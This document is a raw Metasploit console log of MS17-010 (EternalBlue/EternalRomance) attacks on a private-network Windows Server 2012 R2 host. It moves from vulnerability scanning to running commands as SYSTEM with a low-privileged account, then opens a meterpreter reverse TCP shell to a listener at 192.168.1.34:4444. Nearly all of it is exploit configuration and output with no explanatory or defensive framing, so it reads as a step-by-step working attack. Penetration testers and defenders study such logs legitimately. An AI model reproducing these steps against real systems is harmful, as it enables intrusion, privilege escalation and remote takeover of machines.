=========================================================================================
Metasploit - Eternalblue exploit tests (MS17_010)
=========================================================================================

       =[ metasploit v5.0.70-dev                          ]
+ -- --=[ 1960 exploits - 1094 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection                                                      
   2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great    Yes    DOUBLEPULSAR Payload Execution and Neutralization
   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


========================================================================================
1. Detection/test of 'smb_ms17_010' - Test with no credentials
========================================================================================

msf5 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):
   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.1.50                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) > run
[-] 192.168.1.50:445      - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 192.168.1.50:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


========================================================================================
2. Detection/test of 'smb_ms17_010' - Test with a low-privileged account
========================================================================================

msf5 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):
   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.1.50                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass      password321!                                                    no        The password for the specified username
   SMBUser      user                                                            no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.1.50:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
[*] 192.168.1.50:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


========================================================================================
3. Exploitation attempt of 'smb_ms17_010' - Test with no credentials
========================================================================================

msf5 auxiliary(admin/smb/ms17_010_command) > options

Module options (auxiliary/admin/smb/ms17_010_command):
   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   COMMAND               net group "Domain Admins" /domain                               yes       The command you want to execute on the remote host
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                192.168.1.50                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
   SMBUser                                                                               no        The username to authenticate as
   THREADS               1                                                               yes       The number of concurrent threads (max one per host)
   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory

msf5 auxiliary(admin/smb/ms17_010_command) > run
[-] 192.168.1.50:445      - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
[*] 192.168.1.50:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


========================================================================================
4. Exploitation attempt of 'smb_ms17_010' - Test with a low-privileged account
========================================================================================

msf5 auxiliary(admin/smb/ms17_010_command) > options

Module options (auxiliary/admin/smb/ms17_010_command):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   COMMAND               whoami                                                          yes       The command you want to execute on the remote host
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                192.168.1.50                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass               password321!                                                    no        The password for the specified username
   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
   SMBUser               user                                                            no        The username to authenticate as
   THREADS               1                                                               yes       The number of concurrent threads (max one per host)
   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory

msf5 auxiliary(admin/smb/ms17_010_command) > run

[*] 192.168.1.50:445      - Authenticating to 192.168.1.50 as user 'user'...
[*] 192.168.1.50:445      - Target OS: Windows Server 2012 R2 Standard 9600
[*] 192.168.1.50:445      - Built a write-what-where primitive...
[+] 192.168.1.50:445      - Overwrite complete... SYSTEM session obtained!
[+] 192.168.1.50:445      - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.1.50:445      - checking if the file is unlocked
[*] 192.168.1.50:445      - Getting the command output...
[*] 192.168.1.50:445      - Executing cleanup...
[+] 192.168.1.50:445      - Cleanup was successful
[+] 192.168.1.50:445      - Command completed successfully!
[*] 192.168.1.50:445      - Output for "whoami":

nt authority\system


[*] 192.168.1.50:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


========================================================================================
5. Exploitation attempt of 'ms17_010_psexec' - Test with a low-privileged account
========================================================================================

msf5 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):
   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                192.168.1.50                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass               password321!                                                    no        The password for the specified username
   SMBUser               user                                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.34     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:
   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 192.168.1.34:4444 
[*] 192.168.1.50:445 - Authenticating to 192.168.1.50 as user 'user'...
[*] 192.168.1.50:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 192.168.1.50:445 - Built a write-what-where primitive...
[+] 192.168.1.50:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.1.50:445 - Selecting PowerShell target
[*] 192.168.1.50:445 - Executing the payload...
[+] 192.168.1.50:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.34:4444 -> 192.168.1.50:49263) at 2020-03-25 06:01:14 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


